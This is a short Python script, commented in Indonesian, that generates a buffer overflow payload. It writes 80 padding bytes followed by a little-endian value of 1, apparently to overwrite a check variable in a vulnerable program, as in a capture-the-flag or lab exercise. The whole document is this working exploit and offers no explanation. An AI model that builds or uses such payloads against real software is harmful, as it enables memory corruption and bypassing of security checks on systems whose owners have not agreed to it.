import sys

# Coba OFFSET = 80 (76 + 4 bytes padding)
OFFSET = 80
padding = b'A' * OFFSET
non_zero_value = b'\x01\x00\x00\x00' # Nilai 1 (Little-Endian)

payload = padding + non_zero_value

sys.stdout.buffer.write(payload)

print(f"\n[INFO] Payload berhasil dibuat dengan total {len(payload)} bytes (Offset 80).")
